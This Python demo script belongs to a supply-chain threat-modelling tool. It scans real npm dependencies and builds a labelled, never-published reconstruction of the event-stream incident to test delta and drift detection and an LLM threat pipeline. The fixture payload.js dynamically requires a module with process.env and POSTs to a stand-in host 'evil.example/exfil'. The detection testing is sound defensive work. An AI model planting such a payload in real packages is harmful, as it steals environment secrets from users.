"""W3-4 live end-to-end harness: real dependency analysis + a reconstructed
supply-chain incident, fed into a real pipeline run.

What this does, in order:

1. `analyze_manifest()` on the real `package.json`/`package-lock.json` next to
   this file — a real npm registry resolve, a real tarball fetch (cached
   after the first run), and a real Semgrep scan for every direct dependency.
2. Builds an **inert, reconstructed** event-stream-style incident package
   (never published, never executed) using the exact payload shape already
   covered by `tests/test_deps_incidents.py`, and runs the same real scanner
   + `compute_delta` + `compare_sources` against it. Delta is computed
   against the real, cached `event-stream@3.3.5` profile. The reconstructed
   version is always labelled `3.3.6-reconstructed` so it can never be
   mistaken for a real published release — in the heatmap, threat
   descriptions, SARIF, and every export.
3. Appends the reconstructed package to the real `DependencyContext` and runs
   a real pipeline (`run_pipeline_for_model`), persists the result, and
   prints the model ID so it can be opened in the UI.

This is a demo/dev script, not product code — it is not packaged
(`pyproject.toml` only includes `backend*`, `cli*`, `seeds*`) and the
reconstructed-incident logic lives only here plus in the test suite, never in
`backend/`.

Usage:
    python examples/arsenal-deps/inject_incident.py [--source npm|both] [--no-llm]

Requires ANTHROPIC_API_KEY in the environment (or `.env`) unless --no-llm.
"""

from __future__ import annotations

import argparse
import asyncio
import json
import os
import sys
import tempfile
from datetime import UTC, datetime
from pathlib import Path

import httpx


sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from backend.deps.analyze import analyze_manifest
from backend.deps.delta import compute_delta
from backend.deps.drift import compare_sources
from backend.deps.resolver import resolve_npm
from backend.deps.scanner import scan_source
from backend.models.dependencies import (
    DependencyContext,
    PackageAnalysis,
    PackageRef,
    ResolvedPackage,
)
from backend.models.enums import Framework, SourceKind


HERE = Path(__file__).parent
RECONSTRUCTED_VERSION = "3.3.6-reconstructed"


def _write(content_dir: Path, rel_path: str, text: str) -> None:
    path = content_dir / rel_path
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


async def _build_reconstructed_incident(client: httpx.AsyncClient) -> PackageAnalysis:
    """Real scan of a reconstructed event-stream-style incident, never
    written into DEPS_CACHE_DIR — the fixture only ever lives in a temp dir."""
    # The real, clean, cached event-stream@3.3.5 profile is the delta baseline.
    prev_resolved = await resolve_npm("event-stream", "3.3.5", client)
    from backend.deps.fetcher import fetch_source

    prev_fetch = await fetch_source(prev_resolved, SourceKind.NPM_TARBALL, client)
    if prev_fetch.path is None:
        raise RuntimeError(
            "event-stream@3.3.5 isn't in the local cache — run the dependency "
            "benchmark or `paranoid deps scan event-stream@3.3.5` once first."
        )
    prev_profile = await scan_source(
        prev_fetch.path, SourceKind.NPM_TARBALL, name="event-stream", version="3.3.5"
    )

    with tempfile.TemporaryDirectory(prefix="arsenal-incident-") as tmp:
        tmp_path = Path(tmp)

        # The malicious tarball: a dynamically-loaded module that exfiltrates
        # over the network, present in the published tarball only.
        curr_dir = tmp_path / "curr"
        curr_dir.mkdir()
        _write(
            curr_dir,
            "package.json",
            json.dumps({"name": "event-stream", "version": RECONSTRUCTED_VERSION}),
        )
        _write(curr_dir, "index.js", "module.exports = function () { return true; };")
        _write(
            curr_dir,
            "payload.js",
            "var mod = process.env.SOME_FLAG ? './a' : './b';\n"
            "require(mod)(process.env);\n"
            "fetch('https://evil.example/exfil', {method: 'POST'});\n",
        )

        # The real GitHub source at the same nominal version — clean, no payload.js.
        github_dir = tmp_path / "github"
        github_dir.mkdir()
        _write(
            github_dir,
            "package.json",
            json.dumps({"name": "event-stream", "version": RECONSTRUCTED_VERSION}),
        )
        _write(github_dir, "index.js", "module.exports = function () { return true; };")

        curr_profile = await scan_source(
            curr_dir, SourceKind.NPM_TARBALL, name="event-stream", version=RECONSTRUCTED_VERSION
        )
        github_profile = await scan_source(
            github_dir, SourceKind.GITHUB, name="event-stream", version=RECONSTRUCTED_VERSION
        )

        curr_resolved = ResolvedPackage(
            name="event-stream",
            version=RECONSTRUCTED_VERSION,
            tarball_url="https://registry.npmjs.org/event-stream/-/event-stream-RECONSTRUCTED.tgz",
            integrity="sha512-RECONSTRUCTED-DEMO-FIXTURE-NOT-A-REAL-PACKAGE",
            publisher="new-account-demo-fixture",
            published_at=datetime.now(UTC),
            github_status="resolved",
        )

        delta = compute_delta(prev_resolved, curr_resolved, prev_profile, curr_profile)
        drift = compare_sources(
            "event-stream",
            RECONSTRUCTED_VERSION,
            curr_dir,
            curr_profile,
            github_dir,
            github_profile,
        )

        print("\n--- Reconstructed incident delta (event-stream 3.3.5 -> 3.3.6-reconstructed) ---")
        print(f"  categories_added:     {[c.value for c in delta.categories_added]}")
        print(f"  categories_removed:   {[c.value for c in delta.categories_removed]}")
        print(f"  publisher_changed:    {delta.publisher_changed}")
        print(f"  semver_jump:          {delta.semver_jump}")
        print(f"  flags:                {delta.flags}")
        print(f"  drift.status:         {drift.status}")
        print(f"  drift.signal:         {drift.signal}")
        print(f"  drift.unexplained:    {drift.unexplained}")
        print(f"  drift.signal_categories: {[c.value for c in drift.signal_categories]}")
        print("--- end delta ---\n")

        return PackageAnalysis(
            ref=PackageRef(name="event-stream", version=RECONSTRUCTED_VERSION),
            resolved=curr_resolved,
            npm_profile=curr_profile,
            github_profile=github_profile,
            drift=drift,
        )


async def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--source", choices=["npm", "both"], default="both")
    parser.add_argument(
        "--no-llm", action="store_true", help="Skip the pipeline run; just print the delta"
    )
    parser.add_argument("--model-id", default=None)
    args = parser.parse_args()

    manifest_data = json.loads((HERE / "package.json").read_text(encoding="utf-8"))
    lockfile_data = json.loads((HERE / "package-lock.json").read_text(encoding="utf-8"))
    description = (HERE / "description.md").read_text(encoding="utf-8")

    async with httpx.AsyncClient(timeout=60.0) as client:
        print(
            f"Analyzing {len(manifest_data['dependencies'])} real direct dependencies "
            f"(source_mode={args.source})..."
        )
        ctx = await analyze_manifest(
            manifest_data, lockfile_data, source_mode=args.source, client=client
        )
        print(f"  -> {len(ctx.packages)} analyzed, {len(ctx.skipped)} skipped")

        incident = await _build_reconstructed_incident(client)
        packages = sorted([*ctx.packages, incident], key=lambda pa: pa.ref.name)
        ctx = DependencyContext(packages=packages, skipped=ctx.skipped, source_mode=ctx.source_mode)

    if args.no_llm:
        print("--no-llm: stopping before the pipeline run.")
        return

    from backend.config import settings

    api_key = settings.anthropic_api_key or os.getenv("ANTHROPIC_API_KEY")
    if not api_key:
        raise SystemExit("ANTHROPIC_API_KEY is not set — export it or put it in .env")

    from backend.db.persist import persist_pipeline_result
    from backend.pipeline.runner import PipelineStep, run_pipeline_for_model
    from backend.providers.anthropic import AnthropicProvider

    provider = AnthropicProvider(
        model=settings.default_model,
        api_key=api_key,
        effort=settings.anthropic_effort,
    )
    print(f"Provider model: {provider.model}")
    model_id = args.model_id or f"arsenal-deps-demo-{int(datetime.now().timestamp())}"

    # Mirrors cli.output.json_writer.JSONWriter's event-accumulation logic
    # (not imported directly — that module lives under cli/, and importing it
    # here would couple this demo script to CLI internals it doesn't need).
    assets = flows = threats = None
    iterations_completed = 0
    gap_summaries: list[str] = []

    print(f"\nRunning the real pipeline (model_id={model_id})...")
    async for event in run_pipeline_for_model(
        model_id=model_id,
        description=description,
        framework=Framework.STRIDE,
        provider=provider,
        max_iterations=3,
        has_ai_components=False,
        dependency_context=ctx,
    ):
        if event.status == "completed" and event.data:
            if event.step == PipelineStep.EXTRACT_ASSETS and "assets" in event.data:
                assets = event.data["assets"]
            elif event.step == PipelineStep.EXTRACT_FLOWS and "flows" in event.data:
                flows = event.data["flows"]
            elif event.step == PipelineStep.GAP_ANALYSIS and event.iteration:
                iterations_completed = event.iteration
            elif event.step == PipelineStep.COMPLETE:
                if "threats" in event.data:
                    threats = event.data["threats"]
                if "iterations_completed" in event.data:
                    iterations_completed = event.data["iterations_completed"]
                gaps = event.data.get("gaps")
                if isinstance(gaps, list):
                    gap_summaries = [str(g) for g in gaps]
                print(
                    f"  [complete] {event.data.get('total_threats')} total threats, "
                    f"{iterations_completed} iterations"
                )
        elif event.status == "failed":
            print(f"  [FAILED] {event.step}: {event.data}")

    db_model_id = await persist_pipeline_result(
        title="MediaDrop (Arsenal demo)",
        description=description,
        provider="anthropic",
        model_name=provider.model,
        framework=Framework.STRIDE,
        iterations_completed=iterations_completed,
        assets=assets,
        flows=flows,
        threats=threats,
        gap_summaries=gap_summaries or None,
        dependency_context=ctx,
    )

    if db_model_id:
        print(f"\nPersisted model_id = {db_model_id}")
        print("Open it in the UI (Results page) to see the heatmap, the reconstructed")
        print("incident row, and the dependency threats next to the architecture ones.")
    else:
        print("\npersist_pipeline_result returned None — check the logs for the failure.")


async def _run() -> None:
    from backend.db.connection import db

    try:
        await main()
    finally:
        # The shared aiosqlite connection runs on a non-daemon thread; without
        # closing it the process never exits after persisting (the CLI does the same).
        await db.close()


if __name__ == "__main__":
    asyncio.run(_run())
